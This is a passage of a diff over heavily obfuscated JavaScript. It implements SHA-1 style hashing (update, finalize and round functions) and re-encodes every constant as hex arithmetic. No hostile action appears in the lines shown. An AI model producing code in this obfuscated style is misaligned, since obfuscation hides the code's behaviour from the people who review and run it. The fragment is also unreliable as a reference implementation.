-                            (X = V['charCodeAt'](Y)) < -0x265d * -0x1 + -0x39e * -0x2 + -0x2d19 * 0x1 ? a1[Z >> 0x17 * 0x80 + 0x1 * -0x1ae3 + 0x233 * 0x7] |= X << K[-0xd * 0x131 + -0x206e + 0x332 * 0xf & Z++] : X < 0x1b0a + 0xb35 + -0x1e3f ? (a1[Z >> -0x115b + -0xf72 + 0x20cf] |= (-0xaeb + 0x1c1f + 0x1 * -0x1074 | X >> 0xbf * -0x32 + 0x1 * 0x2 + 0x232 * 0x11) << K[0x2230 + -0xbc6 + -0x1667 * 0x1 & Z++], a1[Z >> -0x23fa + -0x4 * -0x9bf + -0x300] |= (-0x245c + -0x51 * 0x4c + 0x1 * 0x3ce8 | 0x221c + 0x487 * -0x8 + 0x25b & X) << K[0x3 * -0x515 + -0x17 * -0x20 + 0xc62 & Z++]) : X < 0x3 * 0x2b74 + 0x10970 + -0x2 * 0x59e6 || X >= -0x7c12 * 0x1 + -0x193f1 + 0x2f003 ? (a1[Z >> -0x4 * -0x8fe + -0x2033 + 0x3 * -0x141] |= (-0x25f0 + 0xe62 + 0x186e | X >> 0xe * -0x1c + 0xff6 + -0xe62) << K[0x2200 + -0x2b * -0x36 + 0x1 * -0x2b0f & Z++], a1[Z >> 0xa * 0x25 + 0x171f + -0x188f] |= (0x1 * 0x15e6 + -0x1e4f * -0x1 + -0x33b5 | X >> 0x2 * -0x148 + 0x164c * -0x1 + 0x18e2 & 0xb50 + -0x8a7 + 0x135 * -0x2) << K[-0xa * 0x83 + 0x1 * 0x40f + 0x89 * 0x2 & Z++], a1[Z >> 0x1818 + 0x2561 + -0x3d77] |= (0x1 * -0x3c4 + -0x1 * -0xaf3 + -0x6af | -0x26c8 + -0x1d53 + 0x445a & X) << K[0xc3 * 0x7 + 0x7 * -0x157 + -0x1 * -0x40f & Z++]) : (X = 0x8cbf * -0x1 + -0x19068 + 0x31d27 + ((-0x1d8 + 0x1 * -0xc5e + -0x4f * -0x3b & X) << 0x1 * 0x1844 + -0x2 * -0x1097 + -0x3968 | -0xd9 + 0xf9f * 0x2 + -0x1a66 & V['charCodeAt'](++Y)), a1[Z >> 0xfaf + -0xe * -0xee + -0x1cb1] |= (0x223 + -0xd33 * 0x1 + 0xc00 | X >> -0x17ce + 0x84a + 0xf96) << K[-0x12be + 0x1bd1 + 0x910 * -0x1 & Z++], a1[Z >> 0x13bd + 0x1 * 0xeb9 + 0xe * -0x276] |= (0x2 * -0x764 + 0x5c4 + 0x984 | X >> -0x20cb + -0x1 * 0x5ce + 0x26a5 & -0x1caf + -0x1 * -0xfb8 + -0xd36 * -0x1) << K[-0x1 * -0x1acf + 0x52 * -0x6a + 0x728 & Z++], a1[Z >> 0x58f + 0x3 * 0x231 + -0x1 * 0xc20] |= (-0x5cc * 0x2 + -0x1 * -0x12f9 + 0x6e1 * -0x1 | X >> 0x1b * 0xb5 + 0x13ff * 0x1 + -0x2710 & 0xe56 * -0x1 + -0x10 * -0x141 + -0x57b) << K[-0x1815 + 0x32c + -0x34 * -0x67 & Z++], a1[Z >> -0x2107 + -0x1aea + 0x95 * 0x67] |= (0x1389 + 0x2 * 0x25f + -0x17c7 | -0x3fc * 0x8 + 0x4 * 0x2a8 + 0x1 * 0x157f & X) << K[-0xf8f + -0x333 * -0x9 + -0xd39 & Z++]);
+                          for (Z = this['start']; Y < a0 && Z < 0x1 * -0x10ad + -0x2374 + 0x3461; ++Y)
+                            (X = V['charCodeAt'](Y)) < -0x5 * 0x2e5 + -0xbb * 0x2 + 0x106f ? a1[Z >> -0x4ca + 0x1 * 0x947 + 0x1 * -0x47b] |= X << K[-0xdc5 + -0x265e + -0x1 * -0x3426 & Z++] : X < -0x26c4 + -0xe31 + 0x3cf5 ? (a1[Z >> -0x21a5 + 0x1273 * 0x1 + 0xf34] |= (-0x915 + 0xdfd + -0x428 | X >> -0x25 * 0x5f + 0x1d27 * 0x1 + -0xf66) << K[0x11 * 0x31 + -0x167c + -0x66a * -0x3 & Z++], a1[Z >> 0xce * 0xb + 0x1b * -0x12 + -0x6f2] |= (-0x21ba + -0x1f0 + 0x242a | -0x89f * 0x3 + 0x1a * -0x13 + 0x4a * 0x61 & X) << K[-0x1b74 + -0x4f8 * -0x3 + 0x5 * 0x283 & Z++]) : X < -0x765 * -0xa + 0x2 * 0x7115 + -0x541c || X >= -0x13c14 + 0xa1b * 0xd + 0x198b5 ? (a1[Z >> -0xb2e + 0x1 * 0x1711 + 0xbe1 * -0x1] |= (0x4ee + -0x807 + 0x9 * 0x71 | X >> 0x1 * 0x101d + -0x1ef0 + 0xedf) << K[-0xbaf * -0x1 + -0x185b + 0xcaf & Z++], a1[Z >> -0x11 * 0x15e + 0x192 * 0x3 + 0x128a] |= (0x8b * 0x4 + -0x2509 + 0xb * 0x337 | X >> 0x1347 + 0xa7 * 0x1a + -0x2437 & 0x107a + -0x1edb + 0xea0) << K[0x1 * -0xc3b + 0x140a + 0x7cc * -0x1 & Z++], a1[Z >> -0x3e9 * -0x4 + 0x21fb + -0x319d] |= (0x3 * 0x751 + 0x2 * -0x93d + -0x2f9 | 0xb * -0x326 + -0x1b1a + 0x9 * 0x6e3 & X) << K[-0x1 * -0x1a3 + -0x5d * -0x31 + 0x1 * -0x136d & Z++]) : (X = -0x1447b + 0x6c58 + 0x1d823 + ((0x23f3 + 0x28e + -0x2 * 0x1141 & X) << 0x107 * 0x7 + -0x23e2 + 0x1cbb | 0x1132 + 0x1440 + -0x2173 & V['charCodeAt'](++Y)), a1[Z >> -0x257 + -0x189 + -0x1 * -0x3e2] |= (-0x59d + 0x96b + -0x2de | X >> -0x1a2b + 0x216f + 0x133 * -0x6) << K[-0xd * 0x1a5 + -0xaf2 + 0x2 * 0x102b & Z++], a1[Z >> -0xf4f * -0x1 + 0x17ad + -0xcfe * 0x3] |= (0x1530 + -0x1a32 + 0x582 | X >> 0x1f79 + -0x13ce + -0xb9f & 0x912 + -0x503 * 0x5 + 0x103c) << K[-0xcbf * -0x2 + -0x1235 + 0x10a * -0x7 & Z++], a1[Z >> 0x1c09 + 0x3 * -0x1cd + -0x10 * 0x16a] |= (-0x1e8 + 0x1c55 + -0x19ed * 0x1 | X >> 0x67 * 0x17 + 0x1cce + -0x2609 & -0x2369 + 0x1a1c + -0x4c6 * -0x2) << K[0x1 * 0x22f9 + -0x21b6 + -0x140 & Z++], a1[Z >> -0x12a4 + -0x1 * -0x1967 + -0x6c1] |= (0x1 * -0xd28 + -0x748 + 0x14f0 | 0x621 + 0xee3 + -0x14c5 & X) << K[-0x2104 + -0x1f0a + 0x4011 & Z++]);
                         }
-                        this['lastByteIn' + 'dex'] = Z, this['bytes'] += Z - this['start'], Z >= 0x16a0 + -0x8 * -0x1a5 + -0xbd8 * 0x3 ? (this['block'] = a1[0x4d * -0x3b + 0x26ef + 0xd0 * -0x1a], this['start'] = Z - (-0x43e + 0xa95 + -0x617), this['hash'](), this['hashed'] = -0x1e3c + 0x9 * -0x319 + 0x3a1e) : this['start'] = Z;
+                        this['lastByteIn' + 'dex'] = Z, this['bytes'] += Z - this['start'], Z >= -0x1e20 + -0x1a21 * -0x1 + 0x43f ? (this['block'] = a1[0x2 * 0x455 + -0x2092 + -0x34 * -0x76], this['start'] = Z - (0x12a6 + -0xbf5 + -0x671), this['hash'](), this['hashed'] = -0x112 * 0x1c + -0x114 * 0x4 + 0x43 * 0x83) : this['start'] = Z;
                       }
-                      return this['bytes'] > -0x99ac8c8 + -0x14dc589c + -0x117 * -0x106d995 && (this['hBytes'] += this['bytes'] / (-0x678692a8 + 0x1c99c61ac + -0x6215cf04) << -0x9bc * 0x1 + -0x1 * -0x51e + -0xc5 * -0x6, this['bytes'] = this['bytes'] % (-0x47cfb64 * -0x5f + 0x15758cbd * -0xc + 0x57214ec0)), this;
+                      return this['bytes'] > -0x7c19c9d8 + 0x6dab5edc + 0x10e6e6afb && (this['hBytes'] += this['bytes'] / (0x2b742 * -0x9e96 + -0x1b54500fc + 0x177e0f * 0x2fd8) << 0x1d55 + 0xc89 * 0x1 + 0x14ef * -0x2, this['bytes'] = this['bytes'] % (-0xb7ed4e1 * 0x20 + -0x5f836dc * 0x2 + 0x27bcb09d8)), this;
                     }
                   }
                   ['finalize']() {
                     if (!this['finalized']) {
-                      this['finalized'] = 0x1123 + 0x4 * 0x5e7 + -0x23 * 0x12a;
+                      this['finalized'] = 0x97c + -0x18 * -0x160 + -0x2a7b;
                       var V = this['blocks'],
                         W = this['lastByteIn' + 'dex'];
-                      V[0x6dd + 0x112a + -0x17f7] = this['block'], V[W >> 0x2b3 + 0x1 * 0x1ef6 + -0x21a7] |= J[0x2387 + -0x3ff + -0x1f85 * 0x1 & W], this['block'] = V[0x1599 + -0xf83 + -0x1 * 0x606], W >= 0x1a03 + -0x32 * 0x67 + -0x1 * 0x5ad && (this['hashed'] || this['hash'](), V[0x1f * -0xa4 + -0x1 * -0xea3 + 0x539] = this['block'], V[0x3 * -0xfe + -0x125c + 0x1566] = V[0xee * -0x4 + 0x1 * 0x1424 + -0x106b] = V[-0x1ca5 + -0x7 * -0x317 + 0x706] = V[0x4 * 0x797 + 0x401 + -0x225a] = V[0xa41 * -0x3 + -0x127 * 0x8 + 0x27ff] = V[-0x18e4 + -0x6d * 0x2f + -0x14 * -0x23f] = V[-0xae3 * -0x1 + 0xc5c + -0x1 * 0x1739] = V[-0x1ad9 + -0x192f + 0x340f] = V[0x1f81 + 0x194d + -0x38c6] = V[-0xf06 + -0x8ad + 0xbde * 0x2] = V[-0x259c + 0x131a + 0x128c] = V[0x18f2 + -0xc9a * 0x1 + -0xc4d] = V[0xf * -0x259 + -0x1 * 0x2272 + 0x45b5 * 0x1] = V[-0x165b + 0x14de + 0x18a] = V[-0x1c5c + 0x1c22 + -0x6 * -0xc] = V[-0x11 * 0x141 + 0x374 + -0x7c * -0x25] = -0x2be + 0x1246 + -0x7 * 0x238), V[0x86e + 0x182 * -0x17 + -0xd27 * -0x2] = this['hBytes'] << 0x2 * 0x13d + -0x1 * 0x144f + 0x11d8 | this['bytes'] >>> -0x1c82 * -0x1 + -0x20cb + 0x233 * 0x2, V[-0x394 * -0x1 + -0x2025 + 0x1 * 0x1ca0] = this['bytes'] << -0x154 * 0xa + 0x1c * -0x101 + -0x1 * -0x2967, this['hash']();
+                      V[0x201c + 0x249f + -0x44ab] = this['block'], V[W >> 0x1910 + 0x42b * -0x9 + 0xc75] |= J[0x1 * 0x11 + 0x113c + -0x114a * 0x1 & W], this['block'] = V[0x1 * 0xc3e + -0x4a4 + 0xc1 * -0xa], W >= 0x1 * 0x2590 + -0x881 + -0x6b * 0x45 && (this['hashed'] || this['hash'](), V[-0x1370 + 0xe57 + 0x519] = this['block'], V[-0x91 * 0x3b + -0xd07 + -0x1741 * -0x2] = V[0x5c9 + 0x1b98 + -0x2160] = V[-0x115 * 0xd + -0x6 * 0x112 + 0x147f] = V[-0xe2 + -0x22dd + -0x2 * -0x11e1] = V[0x3 * -0x905 + 0x14fa + -0xdf * -0x7] = V[0x79 * 0x25 + 0x1f8d * 0x1 + 0x2f * -0x10b] = V[-0x373 * 0x7 + 0x221c + 0x1fd * -0x5] = V[0x1693 + -0x55 * -0x26 + -0x232a] = V[-0x3b * 0x3 + -0x123c + -0x1 * -0x12f5] = V[-0x20a8 + -0x11 * -0x1c5 + 0x29c] = V[0x64a + -0x8d8 * -0x4 + -0x29a0] = V[-0x233 * -0x1 + -0x7 * -0x1d + 0x1 * -0x2f3] = V[0x7b5 + 0x1 * -0xe4e + 0x6a5] = V[-0x1222 + -0x4b * -0x67 + -0x5 * 0x266] = V[0x2 * -0xdf1 + 0xd * 0x8f + 0x14ad] = V[0x442 * -0x1 + 0x25ee + -0x219d] = -0x7cc * 0x1 + 0x10a2 + -0x179 * 0x6), V[-0xd36 * 0x1 + -0x2fc + -0x20 * -0x82] = this['hBytes'] << -0x232b + -0xbc7 + 0x2ef5 | this['bytes'] >>> 0x1212 + -0x1 * 0xcfc + -0x4f9, V[0x1 * 0x1bca + 0x1a * -0x5 + 0x1 * -0x1b39] = this['bytes'] << -0x100 * 0x19 + 0x266d + -0xd6a, this['hash']();
                     }
                   }
                   ['hash']() {
-                    const aa = b;
                     var V, W, X = this['h0'],
                       Y = this['h1'],
                       Z = this['h2'],
                       a0 = this['h3'],
                       a1 = this['h4'],
-                      a2 = this[aa(0x2, '9H#$')];
-                    for (V = 0x1140 + -0x2f * 0xd3 + 0x158d; V < 0xf * -0x25f + -0x12b5 * 0x2 + 0x1d * 0x287; ++V)
-                      W = a2[V - (0x2616 + 0x1 * 0x21e6 + 0xb * -0x68b)] ^ a2[V - (-0x15a + 0xa * 0x275 + -0x1730)] ^ a2[V - (-0x228e + 0x25b1 + 0x3 * -0x107)] ^ a2[V - (0x38d + -0x1e0a + -0x3cb * -0x7)], a2[V] = W << -0xde1 + 0x1f24 + -0x1142 | W >>> 0x594 + -0x1 * 0x22f9 + 0x1d84;
-                    for (V = -0x4f4 + 0x15e8 + -0x10f4; V < -0x37d + 0x596 + -0x205; V += 0xdd * 0x1f + -0x10b + -0x19b3)
-                      X = (W = (Y = (W = (Z = (W = (a0 = (W = (a1 = (W = X << -0x197f + 0x9 * -0xf + -0x71 * -0x3b | X >>> 0xe03 * -0x1 + 0xc4e + 0x1d0) + (Y & Z | ~Y & a0) + a1 + (0xa09 * 0xb079d + 0x3fad * -0x150f1 + -0x11dca79 * -0x39) + a2[V] << 0x847 + -0x5d5 * 0x6 + 0x1 * 0x1ab7) << -0x6a7 * -0x2 + 0xdab + 0xf * -0x1cc | a1 >>> 0x1 * 0x7e8 + 0x13a3 + -0x1b70) + (X & (Y = Y << 0x99a * 0x2 + 0x1 * 0x83 + -0x1399 | Y >>> 0xebe + -0x4ed * 0x6 + 0xed2) | ~X & Z) + a0 + (-0x94 * 0xd1ec42 + -0x150a5675 + 0xe8e96636) + a2[V + (0x1d83 * -0x1 + 0xb48 + 0x48f * 0x4)] << 0x3b9 + 0xe89 + -0x1242) << 0x2390 + 0xe7a + -0x1 * 0x3205 | a0 >>> -0x19d1 + 0xc6 + 0x1926) + (a1 & (X = X << 0x1983 + 0x34 * 0x86 + -0x349d | X >>> -0x119 * 0x1 + 0x1523 * 0x1 + -0x1408) | ~a1 & Y) + Z + (-0x878e0ece + -0x7c0a3b69 + 0x8 * 0x2bc3587a) + a2[V + (0x918 + -0xa5b * 0x1 + 0x145)] << 0x613 * -0x5 + -0x1 * 0x14cf + 0x332e) << -0x1 * -0x1b9f + 0xeb3 + -0x2a4d | Z >>> -0xb3e + -0x1c4f * 0x1 + -0x2f * -0xd8) + (a0 & (a1 = a1 << -0x1319 * 0x1 + 0x1 * -0x17e2 + 0x2b19 | a1 >>> -0x19fd + 0x25d9 + -0xbda) | ~a0 & X) + Y + (0x2a * 0x6bab57 + -0x44ce3e4f + -0x3977ee * -0x277) + a2[V + (0x157a + 0x16e7 + -0x2c5e)] << -0x4 * -0x4df + -0x1 * -0xb8d + 0x1 * -0x1f09) << 0x149 * -0x1 + 0x1 * 0x73d + -0x7 * 0xd9 | Y >>> 0x1d32 + -0xa21 * -0x2 + -0x1 * 0x3159) + (Z & (a0 = a0 << -0x1022 + -0x11d7 * -0x1 + -0x1 * 0x197 | a0 >>> -0x3 * -0x22f + 0x25ff * -0x1 + 0x1f74) | ~Z & a1) + X + (0x17e3c912 * 0x1 + 0x55f3138d * 0x1 + 0x1dcc6 * -0xa61) + a2[V + (0x1d08 + -0x2390 + -0x2 * -0x346)] << 0x1eaa + 0xf5a + -0x2e04, Z = Z << 0x30d * -0x1 + -0x7f * -0x1f + -0xc36 | Z >>> -0xb7 * -0x1e + -0x168c + -0x2 * -0x8e;
-                    for (; V < 0x2 * -0x6d + 0x27 * 0x42 + -0x182 * 0x6; V += -0x15e4 + 0x164d + 0x4 * -0x19)
-                      X = (W = (Y = (W = (Z = (W = (a0 = (W = (a1 = (W = X << 0x1707 * -0x1 + 0x12aa + 0x1 * 0x462 | X >>> -0x1ec3 + 0xb60 * 0x1 + 0x137e) + (Y ^ Z ^ a0) + a1 + (-0x21ee2180 + -0x4f7 * -0x2bf4e3 + -0x4974c5e4) + a2[V] << 0x24b5 + -0x407 * -0x9 + 0x1c * -0x29b) << -0x2 * -0xcb6 + -0x3 * -0xc2b + -0x3de8 | a1 >>> 0xab9 + -0x4 * 0x11d + 0x107 * -0x6) + (X ^ (Y = Y << -0x2699 * 0x1 + 0xfe2 * -0x1 + -0x3 * -0x1233 | Y >>> -0x2f * -0xb5 + -0x1e * -0xb2 + -0x3615) ^ Z) + a0 + (-0x9 * 0x8756ea7 + 0x11af56 * 0xc53 + -0x1ef91162) + a2[V + (0x1cac * -0x1 + 0x2 * 0xb26 + -0x47 * -0x17)] << -0x105d * 0x1 + 0x19d7 + -0x97a) << 0xb7d + 0x31 * 0x16 + -0xfae | a0 >>> -0x1aae + -0x2486 + -0x1 * -0x3f4f) + (a1 ^ (X = X << -0x20ef + -0x949 * -0x4 + -0x417 | X >>> 0x3c5 + -0x1143 + 0xd80) ^ Y) + Z + (-0x125 * -0xb7dbfe + -0x2fdfbde5 * 0x3 + 0x2007887 * 0x16) + a2[V + (-0x2163 + -0xf95 * 0x1 + 0x30fa)] << -0x374 + 0x87 + 0x2ed) << -0x129a + 0xae8 + 0x7b7 | Z >>> 0xb3e + 0x1cd * 0x4 + 0x3 * -0x61d) + (a0 ^ (a1 = a1 << -0xcda + 0x92 * 0x1c + -0x300 | a1 >>> 0x2 * 0xf2f + -0x1 * -0xfa3 + -0x2dff) ^ X) + Y + (0x63861637 + -0x2143383f + 0x2c970da9) + a2[V + (-0x1 * -0x6a4 + -0xbdc + 0x53b)] << 0x1b22 + -0x1d1e + -0x7f * -0x4) << 0x1454 + 0x89 * 0x2b + -0xa * 0x455 | Y >>> -0x2242 + 0x10d8 + 0x159 * 0xd) + (Z ^ (a0 = a0 << -0x1e * 0x3a + 0x16b6 + -0xfcc * 0x1 | a0 >>> 0x5 * -0x3b + 0x1848 + -0x171f * 0x1) ^ a1) + X + (0x66ff1d72 + 0x76a581b2 + -0x6ecab383) + a2[V + (-0x3 * -0xb07 + 0x2331 + -0x4442 * 0x1)] << -0xb63 + -0x26a6 + 0x3209, Z = Z << -0x131 + -0x75 * 0x1d + 0xe90 | Z >>> 0x3 * -0x55b + 0x2037 + -0x1024;
-                    for (; V < 0xb3c + -0x3d7 * -0x9 + -0x2d8f; V += 0x26a8 + 0x69b + -0x2d3e)
-                      X = (W = (Y = (W = (Z = (W = (a0 = (W = (a1 = (W = X << -0xa * 0x27a + -0xae9 + -0xbe6 * -0x3 | X >>> -0x21f9 + 0xb67 + 0x16ad * 0x1) + (Y & Z | Y & a0 | Z & a0) + a1 - (-0x480651a8 * 0x3 + 0xa4a5514a + 0xa * 0x106e9715) + a2[V] << 0x2 * 0x8 + 0x1 * 0x8e7 + 0xf * -0x99) << 0x2237 + 0x1bd5 + 0xc9 * -0x4f | a1 >>> 0x4 * -0x346 + -0x8ff + 0x1632) + (X & (Y = Y << -0x40f + -0x2a6 * -0x8 + -0x1103 | Y >>> -0x96e + -0xcdf * 0x3 + 0x300d) | X & Z | Y & Z) + a0 - (0x44f4aa7f + -0x1 * -0x2d93e777 + -0x1a44ed2) + a2[V + (0x2 * -0x727 + -0x21 * 0x120 + 0x336f)] << -0xb * 0xfd + 0x54 * -0x13 + 0x97 * 0x1d) << 0x3a8 + -0x874 + -0x3 * -0x19b | a0 >>> -0x65 * -0x53 + 0x12e5 * -0x2 + 0x526) + (a1 & (X = X << 0x293 * 0x2 + -0x229e + 0x1d96 | X >>> -0x175 + -0x6ae + -0x2b7 * -0x3) | a1 & Y | X & Y) + Z - (0x2e338228 * 0x2 + 0x28981c6 * 0x42 + -0x53fa682 * 0x1c) + a2[V + (-0xb94 + 0xb90 + 0x6)] << 0x4d7 * 0x7 + -0x1fa3 + -0x23e * 0x1) << 0x1 * -0x1c55 + -0x6 * 0x49f + -0x4a * -0xc2 | Z >>> -0x2 * 0x38b + -0xb * -0x36d + 0xf3f * -0x2) + (a0 & (a1 = a1 << -0x19c3 + -0x24 * 0xc1 + 0x3505 | a1 >>> -0x14f0 + -0xc * -0x129 + 0x3e * 0x1d) | a0 & X | a1 & X) + Y - (-0xc8a43 * 0x38b + -0xd8cd0f35 + 0x6 * 0x3e5a879f) + a2[V + (0x70d * -0x1 + -0x1083 + -0x11 * -0x163)] << -0xd6e + 0xda5 + 0x5 * -0xb) << 0x37e + 0x8ea + 0x15 * -0x97 | Y >>> -0x47 * 0x8b + -0xd55 + 0x33fd) + (Z & (a0 = a0 << 0x2111 + 0x4 * 0x512 + -0x353b | a0 >>> 0x12 * -0x119 + -0x2d2 * -0x8 + -0x2cc) | Z & a1 | a0 & a1) + X - (-0x5bceffd2 + 0x77 * -0xcdb571 + 0x2c15851 * 0x6d) + a2[V + (0x3 * 0x537 + 0xb7d * 0x3 + -0xe * 0x394)] << -0x10cf + 0x1f80 + -0x1 * 0xeb1, Z = Z << 0x19b4 + 0x205 * 0x11 + -0x13f9 * 0x3 | Z >>> 0xd85 * -0x2 + -0x234 + 0x1d40;
-                    for (; V < 0x1 * -0x2007 + -0x1491 + -0x4 * -0xd3a; V += -0x45 * 0x3d + -0x147d + 0xc51 * 0x3)
-                      X = (W = (Y = (W = (Z = (W = (a0 = (W = (a1 = (W = X << 0x4ea * 0x5 + -0x37d * 0x9 + 0x6d8 | X >>> -0x4 * 0x259 + 0xf6b * 0x1 + -0x5ec) + (Y ^ Z ^ a0) + a1 - (-0x11a05f3c + 0x2 * 0x91d53f0 + 0x3502f586) + a2[V] << -0x9f + -0x184a + 0x1 * 0x18e9) << -0x76f * -0x2 + -0xc9b * -0x1 + -0xe * 0x1f6 | a1 >>> -0x18ea + 0x1 * 0x41b + 0x14ea) + (X ^ (Y = Y << -0x1 * 0x1c03 + -0x11e7 * -0x1 + -0xa3a * -0x1 | Y >>> 0x1 * 0x13ed + 0x3 * 0x4a9 + -0x1 * 0x21e6) ^ Z) + a0 - (0x27aab72d + -0x248304ce + -0x7355d1d * -0x7) + a2[V + (-0x7 * 0x36d + -0x22eb * 0x1 + -0x11 * -0x377)] << -0x14b3 + -0x55d + -0x10 * -0x1a1) << -0x568 + 0x3 * 0x8c1 + -0x14d6 | a0 >>> -0x12d7 + -0x1 * -0x2425 + -0x1133) + (a1 ^ (X = X << 0x3e8 + -0x3 * 0x7ae + 0x1340 | X >>> -0x176 + 0x1f97 * -0x1 + 0x210f) ^ Y) + Z - (-0x29426383 + 0x67a7964e + -0x8c7f4a1) + a2[V + (0x2611 + 0x172 * 0x13 + -0x4185)] << 0x1f32 + -0x219f + 0x26d) << 0x1 * -0x2335 + -0x21aa + 0x44e4 | Z >>> -0x1 * 0x16a9 + -0xc5e * 0x1 + -0x2 * -0x1191) + (a0 ^ (a1 = a1 << -0x1509 + -0x1 * -0x57a + 0xfad | a1 >>> -0xa9 * -0x23 + -0x2 * 0x9dc + 0xad * -0x5) ^ X) + Y - (0x58b * 0x106991 + -0x52 * 0x9958f7 + 0x6b * 0x1c22e7) + a2[V + (-0x7b3 + 0x2e * -0x23 + -0x20 * -0x70)] << 0xe0f + 0x38 * -0x9e + -0x1 * -0x1481) << 0x1b94 + -0x1 * -0x196d + 0x4 * -0xd3f | Y >>> -0x2df * -0x3 + 0x67f * -0x6 + 0x1e78) + (Z ^ (a0 = a0 << -0x12ae + 0x247b + 0x3 * -0x5e5 | a0 >>> -0x42c + 0x1 * -0x1b67 + -0x1f95 * -0x1) ^ a1) + X - (0x40bccfce + -0x3 * 0x1d504c24 + 0xc8aaa4 * 0x62) + a2[V + (-0x707 * -0x1 + 0x1e96 + -0x2599)] << 0x1260 + -0xe34 + 0x4 * -0x10b, Z = Z << 0x573 + 0xcb6 + 0x95 * -0x1f | Z >>> 0x967 * -0x2 + -0x1524 + 0x27f4;
-                    this['h0'] = this['h0'] + X << 0x1f * -0xb2 + 0x1aad * 0x1 + 0x17 * -0x39, this['h1'] = this['h1'] + Y << 0xe6d + -0x3 * 0x43f + -0x1b0, this['h2'] = this['h2'] + Z << -0x1 * -0x269f + -0x2 * -0x3c + -0x2717, this['h3'] = this['h3'] + a0 << -0xe27 * 0x2 + 0x14bf + -0x78f * -0x1, this['h4'] = this['h4'] + a1 << 0x1 * 0x1901 + -0x51 * -0x7b + -0x3fec;
+                      a2 = this['blocks'];
+                    for (V = 0x873 * -0x1 + -0x21a4 + 0x3d5 * 0xb; V < -0x1 * 0x24d2 + -0x55c * 0x6 + 0x454a; ++V)
+                      W = a2[V - (0x164b + 0x310 + -0x1958)] ^ a2[V - (0x12f3 + -0x2531 + -0x1246 * -0x1)] ^ a2[V - (-0xc7 * 0x7 + -0x1311 * -0x1 + -0xd92)] ^ a2[V - (0x6 * -0x2fb + -0x925 * -0x1 + -0x3 * -0x2ef)], a2[V] = W << 0x1df * -0x9 + 0x1f08 + -0xe30 | W >>> 0x2007 + -0x19 * 0xce + -0x3 * 0x3ee;
+                    for (V = 0x1 * 0x2167 + -0x1f98 + -0x1cf; V < 0x37 * 0xe + 0x5 * -0x18d + 0x4d3; V += -0xca * -0x5 + -0x8 * 0x3bd + 0x19fb)
+                      X = (W = (Y = (W = (Z = (W = (a0 = (W = (a1 = (W = X << 0xb * -0x2e + 0x11e8 + -0xfe9 | X >>> -0x1e89 * -0x1 + -0x1fb4 + 0x146) + (Y & Z | ~Y & a0) + a1 + (-0x97bd3d4 + 0x13926301 + 0x3bc * 0x158915) + a2[V] << 0xa1 * 0x7 + -0x289 * -0x7 + -0x1626) << -0x6a2 * -0x4 + -0xb7 + -0x19cc | a1 >>> -0x113c * 0x2 + 0x5e7 + 0x1cac) + (X & (Y = Y << -0x169 * 0x17 + 0x155d * -0x1 + 0x35ea * 0x1 | Y >>> 0x3ce * -0x9 + -0x2cf * -0x1 + 0xa7b * 0x3) | ~X & Z) + a0 + (0x33f8 * -0x30ae5 + -0x17d64c65 + -0x13e * -0xdb57b5) + a2[V + (0x1 * -0xacb + 0x1df0 + -0xf5 * 0x14)] << -0x1c85 + 0x237d + -0x6f8) << 0xd21 + -0x337 * -0x6 + -0x2066 | a0 >>> 0x43f * 0x1 + -0x7f * 0x3e + 0x1a9e) + (a1 & (X = X << -0xf62 + 0x1c0f + -0x283 * 0x5 | X >>> -0x2e + 0x1 * 0x212 + -0x1e2 * 0x1) | ~a1 & Y) + Z + (-0x1bc36c4c + 0x713f5560 + -0x1acdad7 * -0x3) + a2[V + (0x1 * 0x3df + -0x19a9 + 0x15cc)] << -0x2704 + -0x9d4 + 0x30d8) << 0x215 * 0xa + -0x348 + -0x1185 | Z >>> 0x1 * -0xf16 + 0x22ef + -0x13be) + (a0 & (a1 = a1 << 0x1d * 0xc5 + 0x21b5 * -0x1 + 0x5c1 * 0x2 | a1 >>> 0x2293 + 0x1 * 0x9c7 + -0x2c58) | ~a0 & X) + Y + (-0x8a54cfc7 + 0x1 * -0xa625219f + 0x1 * 0x18afc6aff) + a2[V + (-0x1c18 * -0x1 + 0x1 * 0xeb2 + 0x2f * -0xe9)] << 0x1e71 * -0x1 + -0xc64 + 0x33 * 0xd7) << -0x1b * 0x15f + 0x103 * 0xb + 0x19e9 | Y >>> 0x97 + -0x557 + 0x4db) + (Z & (a0 = a0 << 0xf1b + 0x170 * -0x1 + -0xd8d | a0 >>> -0x470 + -0x3 * 0xa05 + 0x1 * 0x2281) | ~Z & a1) + X + (-0x5 * 0x1c78b637 + 0x50a68b96 + 0x98377d16) + a2[V + (0xf7b + -0x2252 + 0x12db)] << -0x749 + -0x232b + 0x2a74, Z = Z << 0x1c1a + 0x3c * -0x26 + 0x4a * -0x42 | Z >>> -0x1ba8 + -0x13f5 + 0x1 * 0x2f9f;
+                    for (; V < 0x554 + 0x2 * 0x12b6 + 0x1d * -0x178; V += -0x19e9 * 0x1 + 0x1803 + 0x1eb)
+                      X = (W = (Y = (W = (Z = (W = (a0 = (W = (a1 = (W = X << -0x2f * -0x5e + -0x97e + -0x7bf | X >>> -0x2217 + -0x175 * 0xe + 0x3698) + (Y ^ Z ^ a0) + a1 + (0x199 * 0x6d3a8d + 0xa1f0ed * -0x103 + 0x642e2023) + a2[V] << -0x14ae * -0x1 + 0x1 * 0x265a + -0x3b08) << 0x599 * -0x4 + 0x1d46 + -0x7 * 0xfb | a1 >>> -0x99b * -0x1 + 0x255c + -0x2edc) + (X ^ (Y = Y << 0x127f + 0x1c4d + -0x2eae | Y >>> -0x20 * -0xf4 + 0x51 * -0x5f + -0x6f) ^ Z) + a0 + (0x2cc1 * -0x40bc + -0x1b5c2e9 * 0x2d + -0x3 * -0x425f6ec6) + a2[V + (0x28 * -0x5 + 0xda3 + 0xcda * -0x1)] << -0x8 * -0x290 + 0x8a8 + 0x1 * -0x1d28) << -0x1 * 0x9b3 + -0xf25 + 0x14f * 0x13 | a0 >>> -0x4 * -0x808 + 0x269 * -0x5 + -0x13f8) + (a1 ^ (X = X << 0x15 * 0x14c + 0x1220 + -0x169f * 0x2 | X >>> 0xa76 + -0x2454 + 0x19e0) ^ Y) + Z + (0x7a38bde2 * 0x1 + 0x8 * -0x17d3fec1 + 0xb34123c7) + a2[V + (-0x1e7d + 0xce2 + -0x1f5 * -0x9)] << -0x10 * 0x20f + -0x115d + -0x1 * -0x324d) << 0xd59 + 0x1aeb + -0x283f | Z >>> -0x1df8 + 0x1890 + 0x1 * 0x583) + (a0 ^ (a1 = a1 << 0x1274 * 0x1 + 0x1c89 + -0x2edf | a1 >>> 0x3d * -0x13 + 0x4cb + -0x42) ^ X) + Y + (-0xd * 0x1048b695 + 0x750b4d6e + -0xcd7fe3c4 * -0x1) + a2[V + 